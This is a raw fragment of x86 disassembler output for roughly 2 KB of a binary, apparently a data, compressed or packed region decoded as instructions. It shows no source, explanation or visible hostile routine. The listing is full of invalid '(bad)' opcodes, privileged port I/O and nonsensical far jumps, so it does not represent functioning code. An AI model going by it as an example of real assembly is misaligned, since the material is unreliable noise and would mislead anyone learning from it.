  405f8f:	adc    ecx,DWORD PTR [edi+eax*8+0x2290c3f3]
  405f96:	cdq    
  405f97:	pop    edi
  405f98:	lea    ecx,[ecx-0x5f]
  405f9b:	inc    eax
  405f9c:	xchg   ebx,eax
  405f9d:	dec    ebp
  405f9e:	out    dx,eax
  405f9f:	ror    DWORD PTR [ecx+eax*8-0xc],cl
  405fa3:	cdq    
  405fa4:	sti    
  405fa5:	imul   esp,ecx,0x250201b0
  405fab:	sbb    ebp,edi
  405fad:	gs hlt 
  405faf:	adc    ebp,eax
  405fb1:	icebp  
  405fb2:	(bad)  
  405fb3:	aaa    
  405fb4:	cmp    BYTE PTR [ebx+0x1c],bh
  405fb7:	push   ecx
  405fb8:	or     DWORD PTR [edx-0x626b0c8],0xe6e5528e
  405fc2:	mov    bh,0x6b
  405fc4:	stc    
  405fc5:	test   BYTE PTR [esi-0x1473c148],al
  405fcb:	into   
  405fcc:	sub    BYTE PTR [edi],bl
  405fce:	ret    
  405fcf:	shl    DWORD PTR [edi-0x38c3c15f],1
  405fd5:	inc    edi
  405fd6:	int3   
  405fd7:	push   esi
  405fd8:	mov    dl,0x91
  405fda:	out    dx,eax
  405fdb:	pushf  
  405fdc:	scas   eax,DWORD PTR es:[edi]
  405fdd:	push   ebp
  405fde:	mov    bl,0x89
  405fe0:	xchg   edi,eax
  405fe1:	push   edi
  405fe2:	cmp    DWORD PTR [ebp-0x3d],eax
  405fe5:	mov    BYTE PTR [ecx-0x5d900bcb],cl
  405feb:	leave  
  405fec:	test   al,0x26
  405fee:	fadd   QWORD PTR [ecx-0xd40d485]
  405ff4:	or     ch,BYTE PTR ds:0xf064ad89
  405ffa:	adc    bl,BYTE PTR [ecx+edx*8-0x1c]
  405ffe:	inc    eax
  405fff:	mov    DWORD PTR [eax],eax
  406001:	inc    edi
  406002:	shl    BYTE PTR [edi+0x4a],cl
  406005:	push   ecx
  406006:	icebp  
  406007:	adc    ebp,0xa29f1a09
  40600d:	jge    0x40601e
  40600f:	ror    DWORD PTR ds:0x96be0562,cl
  406015:	js     0x406009
  406017:	iret   
  406018:	ror    DWORD PTR [esi-0x54],cl
  40601b:	dec    ebx
  40601c:	fbld   TBYTE PTR ds:0x66e35576
  406022:	repz or eax,0x45713147
  406028:	add    eax,0x3eade2a7
  40602d:	lods   al,BYTE PTR ds:[esi]
  40602e:	push   ds
  40602f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406030:	mov    ecx,0xb7537883
  406035:	(bad)  
  406036:	xor    cl,BYTE PTR [edx+0x9686e14]
  40603c:	mov    ecx,0xc41d0774
  406041:	xchg   ecx,eax
  406042:	push   edi
  406043:	sbb    DWORD PTR [edi-0x21],0x955ac8c0
  40604a:	mov    dl,0xf7
  40604c:	ins    BYTE PTR es:[edi],dx
  40604d:	(bad)  
  40604f:	dec    edx
  406050:	retf   0x9683
  406053:	pop    ebp
  406054:	repz adc DWORD PTR [eax-0x19],ecx
  406058:	mov    ecx,0x89f74aca
  40605d:	out    dx,eax
  40605e:	cmp    esp,ebp
  406060:	in     eax,dx
  406061:	sub    ah,cl
  406063:	dec    esp
  406064:	sahf   
  406065:	or     eax,DWORD PTR [ebp+0x2e]
  406068:	sub    DWORD PTR [edx+0x71],0x76b66fc5
  40606f:	in     eax,dx
  406070:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406071:	mov    ah,0x71
  406073:	jp     0x4060d3
  406075:	sbb    BYTE PTR [edi],0x1c
  406078:	xchg   eax,eax
  40607a:	fsub   st,st(6)
  40607c:	xchg   DWORD PTR fs:[edi+0x4b581924],esi
  406083:	and    DWORD PTR [edi+edx*1+0x4d],ebx
  406087:	mov    DWORD PTR [eax+0x17b5b38a],esi
  40608d:	mov    esi,DWORD PTR [esi+ebp*8+0xc]
  406091:	dec    ecx
  406092:	ret    
  406093:	jecxz  0x4060c6
  406095:	ins    BYTE PTR es:[edi],dx
  406096:	mov    esi,0x22c8f65b
  40609b:	test   eax,0x35bbd84e
  4060a0:	std    
  4060a1:	jbe    0x40609a
  4060a3:	ss inc ebp
  4060a5:	jle    0x40605a
  4060a7:	sub    edx,DWORD PTR [esi-0x2e]
  4060aa:	adc    DWORD PTR [ecx-0x30953a8a],eax
  4060b0:	mov    ah,0xee
  4060b2:	pop    esi
  4060b3:	idiv   BYTE PTR [ecx]
  4060b5:	xchg   DWORD PTR [esi+ebx*2-0x6c3b8860],eax
  4060bc:	xchg   DWORD PTR [edx+0x23],edi
  4060bf:	add    eax,0x1cfc664d
  4060c4:	test   DWORD PTR [ebx],edi
  4060c6:	dec    edi
  4060c7:	mov    ebx,0x1571fcf4
  4060cc:	and    DWORD PTR [ecx+0x31],edi
  4060cf:	jns    0x406109
  4060d1:	dec    edi
  4060d2:	repz mov eax,ds:0x31a5a945
  4060d8:	jbe    0x40605e
  4060da:	sub    edi,DWORD PTR [eax+0x68327d77]
  4060e0:	test   eax,0xe0dde88d
  4060e5:	mov    al,ds:0xb76c9d3a
  4060ea:	ds js  0x406126
  4060ed:	add    dh,0xa1
  4060f0:	mov    fs,WORD PTR ds:0x707a75e4
  4060f6:	ja     0x4060d7
  4060f8:	push   edi
  4060f9:	(bad)  
  4060fa:	ss pop ss
  4060fc:	out    dx,eax
  4060fd:	or     eax,0x6035a38d
  406102:	dec    ecx
  406103:	jne    0x40610a
  406105:	dec    edx
  406106:	mov    ebp,0x9df996b
  40610b:	ret    0x772a
  40610e:	cwde   
  40610f:	sbb    eax,0xf089af0b
  406114:	outs   dx,DWORD PTR ds:[esi]
  406115:	cmp    al,0xcf
  406117:	cld    
  406118:	add    bh,BYTE PTR [edi-0x499eec73]
  40611e:	int3   
  40611f:	nop
  406120:	cmp    DWORD PTR [eax],0x62e1d94d
  406126:	outs   dx,DWORD PTR ds:[esi]
  406127:	aas    
  406128:	call   0x2e73:0x74ec19bb
  40612f:	fstp   DWORD PTR [eax]
  406131:	adc    al,0x23
  406133:	adc    eax,0x8f028071
  406138:	adc    ah,BYTE PTR [edi+edx*4-0x6a]
  40613c:	pusha  
  40613d:	lock dec esi
  40613f:	mov    eax,ds:0x5cca94c1
  406144:	out    dx,al
  406145:	or     edx,esi
  406147:	and    al,0x7
  406149:	sbb    cl,BYTE PTR [edx+0x0]
  40614c:	push   edi
  40614d:	loop   0x40612e
  40614f:	sub    al,0x69
  406151:	push   esi
  406152:	or     eax,0x92605ba
  406157:	jb     0x40615c
  406159:	inc    ebx
  40615a:	mov    eax,0xad9d7f59
  40615f:	and    bl,BYTE PTR [eax]
  406161:	stos   DWORD PTR es:[edi],eax
  406162:	sahf   
  406163:	cmp    esp,DWORD PTR [edx-0x66fae223]
  406169:	pop    eax
  40616a:	xchg   edi,eax
  40616b:	sub    ecx,DWORD PTR [esi]
  40616d:	dec    ecx
  40616e:	scas   al,BYTE PTR es:[edi]
  40616f:	jb     0x406169
  406171:	rcl    bl,cl
  406173:	mov    bh,0x37
  406175:	pusha  
  406176:	nop
  406177:	pusha  
  406178:	xchg   esi,eax
  406179:	ins    BYTE PTR es:[edi],dx
  40617a:	adc    eax,0xfa5a9ca8
  40617f:	push   edx
  406180:	cmp    BYTE PTR [ebp-0x36],ch
  406183:	xor    al,0x97
  406185:	xchg   edi,eax
  406186:	push   eax
  406187:	or     edx,edx
  406189:	push   0xb0357b8f
  40618e:	test   eax,0xb1d91cf4
  406193:	rol    DWORD PTR ds:0xc18551fd,cl
  406199:	mov    ebp,0xfe71c21f
  40619e:	aas    
  40619f:	xor    ebx,0xffffff95
  4061a2:	outs   dx,DWORD PTR ds:[esi]
  4061a3:	sar    edi,1
  4061a5:	in     al,0xc3
  4061a7:	imul   BYTE PTR [ecx]
  4061a9:	inc    edx
  4061aa:	(bad)  
  4061ac:	(bad)  
  4061ae:	cmp    al,0x2f
  4061b0:	add    bl,BYTE PTR [ecx+0x32]
  4061b3:	test   bh,bl
  4061b5:	loop   0x40616d
  4061b7:	(bad)  
  4061b8:	mov    dh,0x54
  4061ba:	aad    0x2a
  4061bc:	aas    
  4061bd:	in     al,0xa
  4061bf:	add    al,0x30
  4061c1:	mul    BYTE PTR [eax-0x6f6381dd]
  4061c7:	popf   
  4061c8:	xlat   BYTE PTR ds:[ebx]
  4061c9:	sub    cl,dh
  4061cb:	mov    esi,0xb91dd6dc
  4061d0:	xor    bl,BYTE PTR [edi+0x1736ed3f]
  4061d6:	fmul   QWORD PTR [ebp-0x4ff7e45f]
  4061dc:	nop
  4061dd:	int    0x2c
  4061df:	out    0x39,eax
  4061e1:	test   BYTE PTR [esi-0x1c67c8de],cl
  4061e7:	xor    eax,DWORD PTR [ecx]
  4061e9:	push   ecx
  4061eb:	dec    eax
  4061ec:	xor    al,0x8d
  4061ee:	test   eax,0xa3de78a2
  4061f3:	mov    ds:0xb78fbc26,al
  4061f8:	inc    ebp
  4061f9:	leave  
  4061fa:	pop    ecx
  4061fb:	fisttp QWORD PTR [edx-0x5fc9a77a]
  406201:	loopne 0x4061d2
  406203:	pop    esp
  406204:	add    dl,dl
  406206:	retf   0xf224
  406209:	(bad)
  40620f:	push   cs
  406210:	pop    ebp
  406211:	leave  
  406212:	jae    0x406228
  406214:	sbb    ebp,DWORD PTR [ebp-0x7bc73618]
  40621a:	out    dx,eax
  40621b:	aad    0x9c
  40621d:	addr16 mov eax,ds:0x2c47
  406221:	enter  0x13a3,0xe3
  406225:	sub    al,0xa9
  406227:	enter  0xac94,0x35
  40622b:	add    eax,0xe0aabb7a
  406230:	sub    ebp,DWORD PTR [edx]
  406232:	push   es
  406233:	cmp    BYTE PTR [ebp-0x74],dh
  406236:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406237:	cld    
  406238:	test   al,0x43
  40623a:	mov    al,ds:0xe66de52c
  40623f:	sbb    DWORD PTR [edx-0x49075fc0],eax
  406245:	cmp    eax,esp
  406247:	jae    0x4061dd
  406249:	into   
  40624a:	mov    dh,0xec
  40624c:	pushf  
  40624d:	fadd   DWORD PTR ds:0xa436b69b
  406253:	out    0xda,eax
  406255:	fsub   QWORD PTR [ebx-0x4b]
  406258:	mov    ds:0x7c2e422f,al
  40625d:	pusha  
  40625e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40625f:	faddp  st(5),st
  406261:	dec    eax
  406262:	xchg   BYTE PTR [eax-0x3c],ah
  406265:	mov    ds:0xa52266ec,eax
  40626a:	clc    
  40626b:	popa   
  40626c:	push   esp
  40626d:	xchg   edi,eax
  40626e:	xchg   esp,eax
  40626f:	or     eax,0xc9fda89
  406274:	addr16 out 0xe4,eax
  406277:	jmp    0x4062f6
  406279:	push   cs
  40627a:	frstor [edx+0x4079b72a]
  406280:	ret    0x9a2
  406283:	aas    
  406284:	ins    BYTE PTR es:[edi],dx
  406285:	nop
  406286:	pop    ebp
  406287:	out    0x35,al
  406289:	lahf   
  40628a:	in     al,0xa4
  40628c:	fdivr  QWORD PTR [eax+ebx*1-0x4a72ec40]
  406293:	icebp  
  406294:	cmp    DWORD PTR [esi-0x56],esi
  406297:	pop    ebx
  406298:	push   eax
  406299:	es (bad) 
  40629b:	cmp    ch,al
  40629d:	xor    eax,0xcee7a74d
  4062a2:	test   DWORD PTR [ebp*2-0x4e7544c1],edi
  4062a9:	mov    ebx,0x5ce29eaa
  4062ae:	jmp    0x406257
  4062b0:	retf   
  4062b1:	add    esi,ecx
  4062b3:	ja     0x406330
  4062b5:	adc    eax,0x99c62b7a
  4062ba:	js     0x406333
  4062bc:	or     cl,BYTE PTR [ecx+0xf3ad1d6]
  4062c2:	mov    ch,0xe8
  4062c4:	mov    ds:0xae01ae62,al
  4062c9:	pop    ebp
  4062ca:	sub    DWORD PTR [ebx+esi*1-0x2a],esp
  4062ce:	inc    ebx
  4062cf:	jne    0x406281
  4062d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062d2:	pop    cx
  4062d4:	sar    DWORD PTR [esi-0x1001337],cl
  4062da:	dec    esp
  4062db:	outs   dx,BYTE PTR ds:[esi]
  4062dc:	test   ah,bh
  4062de:	iret   
  4062df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062e0:	sti    
  4062e1:	js     0x4062a9
  4062e3:	mov    al,0x18
  4062e5:	xor    eax,0xa728cbe3
  4062ea:	push   0x34de8828
  4062ef:	frstor [ecx+edi*1-0x7b]
  4062f3:	(bad)  
  4062f4:	sub    al,0x33
  4062f6:	imul   esi,ebp,0xa38d7bae
  4062fc:	mov    ecx,DWORD PTR [ebx]
  4062fe:	test   BYTE PTR [eax+0x75b7f8c2],ah
  406304:	jae    0x4062e6
  406306:	xlat   BYTE PTR ds:[ebx]
  406307:	ss push ecx
  406309:	call   0x134e:0xe50cc693
  406310:	push   0xffffff9d
  406312:	mov    ds:0x1bbc70ec,al
  406317:	adc    BYTE PTR ds:0x5aba634e,bh
  40631d:	shr    ebx,cl
  40631f:	lahf   
  406320:	mov    bh,0xb4
  406322:	mov    ds:0x3e360cbd,eax
  406327:	popa   
  406328:	or     eax,0x12fa77e5
  40632d:	repz cli 
  40632f:	dec    ebx
  406330:	mov    BYTE PTR [edi+0x2d],0x26
  406334:	lock xchg ebx,esi
  406337:	out    dx,al
  406338:	hlt    
  406339:	pop    ss
  40633a:	jmp    0x139b17b1
  40633f:	push   esi
  406340:	fucomip st,st(4)
  406342:	jl     0x406323
  406344:	xor    al,0x11
  406346:	sbb    eax,0x930a6632
  40634b:	ja     0x4063a4
  40634d:	push   esp
  40634e:	mov    DWORD PTR [edi*8-0x31807e8b],esi
  406355:	stc    
  406356:	mov    ebp,0xa3fb2e30
  40635b:	outs   dx,BYTE PTR ds:[esi]
  40635c:	cdq    
  40635d:	ins    BYTE PTR es:[edi],dx
  40635e:	xchg   ecx,esp
  406360:	or     BYTE PTR [eax+0x551de495],0xb8
  406367:	ja     0x406373
  406369:	out    dx,al
  40636a:	(bad)  
  40636b:	or     BYTE PTR [eax+0x455368b3],bh
  406371:	mov    esp,0xf5f9a942
  406376:	inc    esp
  406377:	imul   esi,DWORD PTR [esp+edi*1],0x62c59f68
  40637e:	adc    BYTE PTR [ebx-0x2ee54383],ch
  406384:	cld    
  406385:	jg     0x406346
  406387:	ss xchg ecx,eax
  406389:	(bad)  
  40638a:	fisttp DWORD PTR ds:0xbaa81e7a
  406390:	pop    esp
  406391:	and    al,0x8c
  406393:	fist   DWORD PTR [eax-0x10]
  406396:	add    al,0x2a
  406398:	sbb    BYTE PTR [ecx],bl
  40639a:	jle    0x406344
  40639c:	mov    dh,0x5a
  40639e:	fcomp  DWORD PTR [ebp-0x65]
  4063a1:	or     ebp,DWORD PTR [esi-0x7f184165]
  4063a7:	lods   eax,DWORD PTR ds:[esi]
  4063a8:	(bad)  
  4063a9:	jo     0x406392
  4063ab:	imul   ecx,DWORD PTR [ebp+ebx*2-0x331dfb47],0x1c
  4063b3:	div    DWORD PTR [edx-0x64d70c76]
  4063b9:	mov    eax,0x4e83eda3
  4063be:	pop    esp
  4063bf:	dec    esi
  4063c0:	test   al,0x8c
  4063c2:	mov    bl,0x1b
  4063c4:	(bad)  
  4063c5:	xor    al,0xd0
  4063c7:	jecxz  0x406366
  4063c9:	fwait
  4063ca:	aas    
  4063cb:	jns    0x40637a
  4063cd:	sbb    al,0xfb
  4063cf:	xor    al,BYTE PTR [edx+ebp*8-0x739dea83]
  4063d6:	retf   
  4063d7:	mov    ch,0xe3
  4063d9:	in     eax,0xfa
  4063db:	inc    edi
  4063dc:	imul   ebx,DWORD PTR [ebx+0x439f63c2],0xffffffec
  4063e3:	xchg   esp,eax
  4063e4:	xor    DWORD PTR [eax-0x4a8d13b1],edi
  4063ea:	ins    BYTE PTR es:[edi],dx
  4063eb:	cmp    eax,0x48be7712
  4063f0:	dec    esp
  4063f1:	xor    ebp,ecx
  4063f3:	dec    ebx
  4063f4:	sbb    DWORD PTR [eax],0xffffffd8
  4063f7:	inc    ebp
  4063f8:	add    DWORD PTR [edi-0x40e8747f],edx
  4063fe:	xchg   ebx,eax
  4063ff:	mov    eax,0xe1692cce
  406404:	xlat   BYTE PTR ds:[ebx]
  406405:	test   eax,0xb71f404
  40640a:	sub    dh,0xfb
  40640d:	aas    
  40640e:	mov    dl,0xb8
  406410:	add    edx,0xb28e3a3f
  406416:	retf   0x54e6
  406419:	jp     0x40645a
  40641b:	fdiv   QWORD PTR [eax+eax*8]
  40641e:	push   es
  40641f:	outs   dx,BYTE PTR ds:[esi]
  406420:	push   ebx
  406421:	add    al,0x3e
  406423:	jle    0x4063c6
  406425:	cmp    eax,DWORD PTR [edx+0x73]
  406428:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406429:	xor    al,0xd7
  40642b:	retf   0x57f3
  40642e:	fnstenv [eax-0x66]
  406431:	ror    ah,1
  406433:	pop    ebp
  406434:	mov    ah,0x60
  406436:	adc    WORD PTR [eax-0x3caa6cf3],sp
  40643d:	outs   dx,BYTE PTR ds:[esi]
  40643e:	pop    edi
  40643f:	jp     0x40645d
  406441:	or     al,0x2c
  406443:	shr    DWORD PTR [eax],0x7a
  406446:	popf   
  406447:	ins    DWORD PTR es:[edi],dx
  406448:	imul   esi,DWORD PTR [ebp+0x62],0x67bb176
  40644f:	out    0x14,al
  406451:	mov    cl,0x5
  406453:	mov    al,ds:0xc0d88b3
  406458:	scas   eax,DWORD PTR es:[edi]
  406459:	dec    edi
  40645a:	nop
  40645b:	pop    esp
  40645c:	xor    BYTE PTR [ebx-0xc],ch
  40645f:	mov    edx,0xb1bd24d0
  406464:	xor    DWORD PTR [ebx-0x174cae7d],edi
  40646a:	push   ds
  40646b:	xor    DWORD PTR [esi+0x16b1717],esp
  406471:	xchg   ebx,eax
  406472:	imul   edi,ecx,0x6fc06ab1
  406478:	push   edx
  406479:	or     eax,0xc1fd1d9c
  40647e:	es xor eax,0x13bced7c
  406484:	jbe    0x40642d
  406486:	ror    DWORD PTR [ebx],0x86
  406489:	jecxz  0x4064c5
  40648b:	mov    edi,ecx
  40648d:	fbstp  TBYTE PTR [ecx+0x5944d628]
  406493:	out    dx,eax
  406494:	xor    dh,BYTE PTR [edi+0xd]
  406497:	popf   
  406498:	jp     0x406478
  40649a:	test   DWORD PTR es:[esp+edi*8+0x1d],ecx
  40649f:	adc    edi,esp
  4064a1:	xchg   edx,eax
  4064a2:	mov    eax,0xa013a322
  4064a7:	sbb    BYTE PTR [ebx-0x39ff5cc4],al
  4064ad:	xor    eax,0xc742a5cd
  4064b2:	mov    ebp,0x191680f
  4064b7:	adc    eax,0xcb45b00c
  4064bc:	mov    ?,ebp
  4064be:	(bad)  
  4064bf:	loope  0x4064a4
  4064c1:	mov    bl,0x34
  4064c3:	mov    al,ds:0x95033cb5
  4064c8:	and    eax,0xeb23e89a
  4064cd:	mov    WORD PTR [esi+eiz*4],gs
  4064d0:	adc    DWORD PTR [ebx-0x4f1c65aa],ecx
  4064d6:	mov    fs,ebx
  4064d8:	and    DWORD PTR [esp+eiz*8],ebx
  4064db:	jo     0x4064a5
  4064dd:	inc    ebx
  4064de:	sti    
  4064df:	ficomp DWORD PTR [esp+ebx*1]
  4064e2:	xor    eax,0xaa2917b2
  4064e7:	lods   eax,DWORD PTR ds:[esi]
  4064e8:	lahf   
  4064e9:	mov    edi,0x33758498
  4064ee:	xlat   BYTE PTR ds:[ebx]
  4064ef:	adc    DWORD PTR [ecx+0x73],0xffffffc1
  4064f3:	xor    DWORD PTR [esi-0x1d],0x46
  4064f7:	outs   dx,DWORD PTR ds:[esi]
  4064f8:	push   edx
  4064f9:	mov    cl,0x86
  4064fb:	and    al,0x12
  4064fd:	out    dx,eax
  4064fe:	aad    0xd3
  406500:	mov    cl,0xf7
  406502:	push   edx
  406503:	dec    edx
  406504:	out    0x5b,eax
  406506:	sbb    dl,BYTE PTR es:[eax-0x7805ad38]
  40650d:	push   edx
  40650e:	xor    esp,esi
  406510:	stc    
  406511:	retf   0xc63e
  406514:	in     eax,0x1f
  406516:	sub    dl,cl
  406518:	cmp    DWORD PTR [eax],esp
  40651a:	pop    es
  40651b:	add    al,0x5
  40651d:	add    DWORD PTR [esp+eax*1-0x4977460e],edi
  406524:	adc    edx,DWORD PTR [ecx+0x58]
  406527:	push   ecx
  406528:	(bad)  
  40652a:	xchg   ebp,eax
  40652b:	lahf   
  40652c:	sbb    ecx,DWORD PTR [ebx]
  40652e:	push   edi
  40652f:	jnp    0x4065a7
  406531:	les    esi,FWORD PTR [ebp+0x5e]
  406534:	lods   eax,DWORD PTR ds:[esi]
  406535:	pop    edi
  406536:	std    
  406537:	loope  0x4065ad
  406539:	push   edi
  40653a:	scas   al,BYTE PTR es:[edi]
  40653b:	loope  0x406551
  40653d:	cmp    eax,edx
  40653f:	je     0x40654b
  406541:	or     esp,DWORD PTR [edx-0x110de894]
  406547:	clc    
  406548:	inc    eax
  406549:	cmp    al,BYTE PTR [ebx]
  40654b:	mov    cl,0x6c
  40654d:	fs in  eax,dx
  40654f:	nop
  406550:	cmp    al,0x72
  406552:	leave  
  406553:	ins    BYTE PTR es:[edi],dx
  406554:	hlt    
  406555:	cdq    
  406556:	imul   ebp,DWORD PTR [ecx-0x1c],0xffffffcd
  40655a:	(bad)  
  40655b:	js     0x406517
  40655d:	pop    ss
  40655e:	addr16 sub esp,edx
  406561:	stos   DWORD PTR es:[edi],eax
  406562:	lds    esi,FWORD PTR [ecx-0x6889ccd5]
  406568:	pop    edi
  406569:	mov    edx,0x9005c22
  40656e:	adc    cl,BYTE PTR [edx+0x1846cc3b]
  406574:	mov    WORD PTR [edx+esi*1],gs
  406577:	xor    DWORD PTR [eax-0x9],0x4d
  40657b:	mov    edi,0x8ee0272d
  406580:	cmp    eax,0x3123d67b
  406585:	sahf   
  406586:	add    BYTE PTR [ebx-0x10],dh
  406589:	inc    esp
  40658a:	jmp    0x5f75:0x37ec741
  406591:	sub    DWORD PTR [edi-0x61b71567],esp
  406597:	cdq    
  406598:	and    bh,BYTE PTR [edi+0x70]
  40659b:	lahf   
  40659c:	in     eax,dx
  40659d:	loop   0x40657f
  40659f:	add    al,0x71
  4065a1:	stc    
  4065a2:	cmp    eax,0x1c949d5e
  4065a7:	dec    ebp
  4065a8:	adc    esp,DWORD PTR [ebx-0x722a81dd]
  4065ae:	cmp    eax,0x4044b444
  4065b3:	jp     0x406580
  4065b5:	dec    edx
  4065b6:	pop    esi
  4065b7:	jmp    0x7fb2:0x9317faf6
  4065be:	call   0xca07:0xe966d97a
  4065c5:	push   cs
  4065c6:	dec    ebx
  4065c7:	pop    esp
  4065c8:	adc    BYTE PTR [esi-0x47],dh
  4065cb:	shr    DWORD PTR [edi],cl
  4065cd:	stos   BYTE PTR es:[edi],al
  4065ce:	jmp    0x4065c7
  4065d0:	out    dx,al
  4065d1:	popf   
  4065d2:	loopne 0x4065f0
  4065d4:	aaa    
  4065d5:	or     BYTE PTR [eax+0xd6edcc4],0x1f
  4065dc:	xor    eax,0xc025888
  4065e1:	inc    ebx
  4065e2:	dec    ebx
  4065e3:	lock mov ecx,0xa561124f
  4065e9:	xchg   esi,eax
  4065ea:	mov    esp,DWORD PTR [ebx]
  4065ec:	dec    edi
  4065ed:	mov    DWORD PTR [ebp+ebp*8+0x28dd9c36],edi
  4065f4:	in     al,dx
  4065f5:	inc    edx
  4065f6:	pop    ebx
  4065f7:	inc    eax
  4065f8:	or     edi,ecx
  4065fa:	mov    eax,0x12797cdb
  4065ff:	jmp    0x4065e8
  406601:	aad    0xd9
  406603:	xchg   ecx,eax
  406604:	mov    edi,0xf1f5f8b9
  406609:	ffree  st(7)
  40660b:	jge    0x406615
  40660d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40660e:	xor    dh,BYTE PTR [esi-0x6badc598]
  406614:	cli    
  406615:	iret   
  406616:	aam    0x49
  406618:	mov    bh,0x49
  40661a:	in     al,0x29
  40661c:	mov    dl,0xe
  40661e:	dec    edx
  40661f:	push   ss
  406620:	sbb    BYTE PTR [ecx-0x75d0a5ff],bh
  406626:	jecxz  0x4066a6
  406628:	cmp    DWORD PTR [ebp+0x5ccbb112],edx
  40662e:	lea    edi,[ecx+0x5558f44d]
  406634:	fwait
  406635:	sbb    DWORD PTR [ebp+0x370ff9fc],esi
  40663b:	dec    ebx
  40663c:	sbb    DWORD PTR ds:0x6c6203c7,eax
  406642:	add    DWORD PTR [edi-0x3ed0369],0x19
  406649:	push   esi
  40664a:	inc    ecx
  40664b:	adc    ebx,ebp
  40664d:	mov    ds:0xdcfa43aa,al
  406652:	pusha  
  406653:	or     edx,eax
  406655:	mov    ebp,0x5e16aa7d
  40665a:	sbb    DWORD PTR [edx-0x169a1d2],esp
  406660:	cld    
  406661:	jecxz  0x4066c9
  406663:	fwait
  406664:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406665:	or     ax,0x4c50
  406669:	out    dx,eax
  40666a:	mov    ds:0xd9b2088a,al
  40666f:	push   es
  406670:	jnp    0x40662f
  406672:	jbe    0x4066b1
  406674:	jp     0x40664e
  406676:	test   al,0x83
  406678:	push   edx
  406679:	jp     0x4066b9
  40667b:	gs fsubrp st(3),st
  40667e:	push   cs
  40667f:	xchg   esp,esi
  406681:	xor    dh,dl
  406683:	mov    ds:0x444bddb,al
  406688:	xor    edi,DWORD PTR [edx+ecx*8+0x75]
  40668c:	out    0x42,eax
  40668e:	xchg   ecx,eax
  40668f:	sbb    dl,BYTE PTR [esi-0x2b]
  406692:	push   eax
  406693:	repz (bad) 
  406695:	mov    al,0xbf
  406697:	pop    ebp
  406698:	pop    ebp
  406699:	outs   dx,DWORD PTR ds:[esi]
  40669a:	ret    0x3ae4
  40669d:	inc    esi
  40669e:	dec    eax
  40669f:	pop    ebx
  4066a0:	dec    ecx
  4066a1:	cdq    
  4066a2:	mul    DWORD PTR [edx+0x8286619]
  4066a8:	pop    edi
  4066a9:	and    eax,0x1e545395
  4066ae:	cvtps2pd xmm7,QWORD PTR [edi+0x3f]
  4066b2:	mov    bh,0x98
  4066b4:	retf   
  4066b5:	neg    edi
  4066b7:	jne    0x406661
  4066b9:	xchg   esp,eax
  4066ba:	xlat   BYTE PTR ds:[ebx]
  4066bb:	add    bh,BYTE PTR [ecx+eax*4]
  4066be:	daa    
  4066bf:	sbb    DWORD PTR [edx+ebx*2-0x46a2946a],0xffffffba
  4066c7:	xchg   ebx,eax
  4066c8:	and    DWORD PTR [eax],esi
  4066ca:	test   DWORD PTR [ebx+0x1],ecx
  4066cd:	popa   
  4066ce:	sub    bh,dh
  4066d0:	xor    DWORD PTR [edx+0x7d4d32a9],ebp
  4066d6:	outs   dx,DWORD PTR ds:[esi]
  4066d7:	mov    cl,0x67
  4066d9:	aas    
  4066da:	jp     0x4066f8
  4066dc:	loopne 0x4066ce
  4066de:	and    DWORD PTR [ecx+0x6a61c2bc],esp
  4066e4:	dec    ebp
  4066e5:	and    ch,bl
  4066e7:	xor    DWORD PTR [edi+0x17],0xfffffff2
  4066eb:	in     eax,dx
  4066ec:	sbb    eax,0x2541df2f
  4066f1:	jne    0x406719
  4066f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066f4:	call   0x5f40:0xdac58203
  4066fb:	pop    ds
  4066fc:	jo     0x40671c
  4066fe:	jno    0x4066ee
  406700:	push   esi
  406701:	xor    al,0x11
  406703:	out    0x98,eax
  406705:	fistp  QWORD PTR [esi+eiz*8+0x26]
  406709:	mov    ds:0x2199b9e7,eax
  40670e:	rcl    DWORD PTR [edi],0x2e
  406711:	pop    ecx
  406712:	outs   dx,BYTE PTR ds:[esi]
  406713:	in     eax,0x62
  406715:	push   esi
  406716:	cmp    ebx,esi
  406718:	cmp    al,0xd2
  40671a:	push   0xf3ed4f99
  40671f:	pop    eax
  406720:	hlt    
  406721:	sti    
  406722:	ins    BYTE PTR es:[edi],dx
  406723:	ror    DWORD PTR [esi+0x61],cl
  406726:	out    0xf5,al
  406728:	fiadd  WORD PTR [ebp-0x55a7763e]
  40672e:	test   eax,0x8bb4ff6d
  406733:	push   ebp
  406734:	out    dx,eax
  406735:	aaa    
  406736:	jmp    0xa78595c0
  40673b:	in     al,0x3f
  40673d:	ins    BYTE PTR es:[edi],dx
  40673e:	push   0x5d
  406740:	loop   0x40673c
  406742:	jg     0x4067a5
  406744:	push   ds
  406745:	pop    ebx
  406746:	add    DWORD PTR [ebp-0x69493749],edx
  40674c:	sbb    eax,0x4785ea0c
  406751:	pusha  
  406752:	mov    esi,eax
  406754:	sbb    eax,0xe5d928c6
  406759:	add    al,BYTE PTR [esi-0x69]
  40675c:	fist   DWORD PTR [ecx]
  40675e:	dec    edx
  40675f:	jle    0x406733
  406761:	jle    0x4067a6
  406763:	imul   esp,DWORD PTR [ebp+ebx*4-0x2d],0x7a1ea63a
  40676b:	mov    dl,0xf5
  40676d:	shr    BYTE PTR [ebp-0x44c85028],0xde
  406774:	je     0x40673b
  406776:	sub    DWORD PTR [ebx+0xe],edx
  406779:	cmp    eax,DWORD PTR [ecx-0x7a]
  40677c:	cld    
  40677d:	and    ch,BYTE PTR [edi+ebx*8-0x60724024]
  406784:	xchg   BYTE PTR [ebx-0x73],bl
  406787:	fild   WORD PTR [ebp+0x5639b023]
  40678d:	daa    
  40678e:	jnp    0x4067e6
  406790:	fwait
  406791:	adc    eax,0x22e18ad0
  406796:	cmp    eax,0xe56b7e1c
  40679b:	xor    al,0x95
  40679d:	cdq    
  40679e:	(bad)  [ecx+edi*1-0x23]
  4067a2:	scas   eax,DWORD PTR es:[edi]
  4067a3:	fist   WORD PTR [edx-0x3326b828]
  4067a9:	and    DWORD PTR [ebx],esp
  4067ab:	mov    bl,0xd4
  4067ad:	add    eax,DWORD PTR [ecx]
